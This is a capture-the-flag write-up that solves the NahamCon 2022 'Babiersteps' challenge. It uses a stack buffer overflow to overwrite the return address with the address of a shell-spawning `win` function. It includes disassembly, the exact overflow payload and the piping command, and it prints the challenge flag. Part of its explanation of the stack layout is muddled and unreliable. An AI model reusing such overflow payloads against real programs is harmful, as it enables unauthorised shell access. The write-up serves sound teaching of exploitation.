# NahamCon CTF 2022: Babiersteps

Category: Binary Exploitation

Points: 50

## Description

> Baby steps! One has to crawl before they can run.

## Attached Files

 - [babiersteps](attached/babiersteps)

## Summary

For this challenge we need to use a buffer overflow attack to change the return address of the function to a pointer to a function that will call a different function called "win" that provides us shell access. We will then run `cat flag.txt` to get the flag.

## Flag

```
flag{4dc0a785da36bfcf0e597917b9144fd6}
```

## Detailed Solution

Let's begin by testing a few values. After I sent a large input, there was a segmentation fault, which indicates that the program could be vulnerable to buffer overflow. After testing out a few more values of different lengths, I concluded that the segmentation fault occurs when the input is 120 bytes long. Let's take a look at the dissassembly of the program.

```bash
objdump -d babiersteps
```

The result is rather large, though there is an interesting function above `main` named `win`.

```
00000000004011c9 <win>:
  4011c9:       f3 0f 1e fa             endbr64
  4011cd:       55                      push   %rbp
  4011ce:       48 89 e5                mov    %rsp,%rbp
  4011d1:       ba 00 00 00 00          mov    $0x0,%edx
  4011d6:       be 00 00 00 00          mov    $0x0,%esi
  4011db:       48 8d 3d 26 0e 00 00    lea    0xe26(%rip),%rdi        # 402008 <_IO_stdin_used+0x8>
  4011e2:       e8 a9 fe ff ff          callq  401090 <execve@plt>
  4011e7:       90                      nop
  4011e8:       5d                      pop    %rbp
  4011e9:       c3                      retq
```

The function `win` makes a call to execve allowing us to execute a shell. However, the function `win` is never called from `main` or from any of the functions called from `main`. the contents of `main` are below.

```
00000000004011ea <main>:
  4011ea:       f3 0f 1e fa             endbr64
  4011ee:       55                      push   %rbp
  4011ef:       48 89 e5                mov    %rsp,%rbp
  4011f2:       48 83 ec 70             sub    $0x70,%rsp
  4011f6:       48 8d 3d 13 0e 00 00    lea    0xe13(%rip),%rdi        # 402010 <_IO_stdin_used+0x10>
  4011fd:       e8 6e fe ff ff          callq  401070 <puts@plt>
  401202:       48 8d 45 90             lea    -0x70(%rbp),%rax
  401206:       48 89 c6                mov    %rax,%rsi
  401209:       48 8d 3d 39 0e 00 00    lea    0xe39(%rip),%rdi        # 402049 <_IO_stdin_used+0x49>
  401210:       b8 00 00 00 00          mov    $0x0,%eax
  401215:       e8 86 fe ff ff          callq  4010a0 <__isoc99_scanf@plt>
  40121a:       b8 00 00 00 00          mov    $0x0,%eax
  40121f:       c9                      leaveq
  401220:       c3                      retq
  401221:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  401228:       00 00 00
  40122b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
```

What is interesting about this function is that it allocates 0x70 bytes for the variables that will be used in the call to `puts` and `__isoc99_scanf`. This means that 0x70 bytes plus 8 bytes for the return address will be used in the call to `puts` and `__isoc99_scanf`. This means that the buffer will be 0x78 bytes long. And 0x78 is also 120 bytes long, which we found out earlier.

After the scanf call, we can use the buffer to call `win`. This is because after the return, there is another 8 bytes with a pointer back to the main function. We will add 8 bytes on to the end of 120 bytes which have our `win` address.

Let's create a payload. We know that the buffer is 0x78 bytes long, so the first bytes can just be the character 'A'. Then we add our `win` address, but in little endian format, meaning that the bytes are in reverse order. As the address of `win` is `0x00000000004011c9`, the little endian format is `0xc911400000000000`. Let's combine these together.

```
( PAYLOAD )
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc9\x11\x40\x00\x00\x00\x00\x00
```

Now let's pass this payload to the program.

```bash
(echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc9\x11\x40\x00\x00\x00\x00\x00"; cat) | ./babiersteps
```

Our buffer overflow attack should work. We can now run `cat flag.txt` to get the flag.

---
[Back to home](../../README.md)
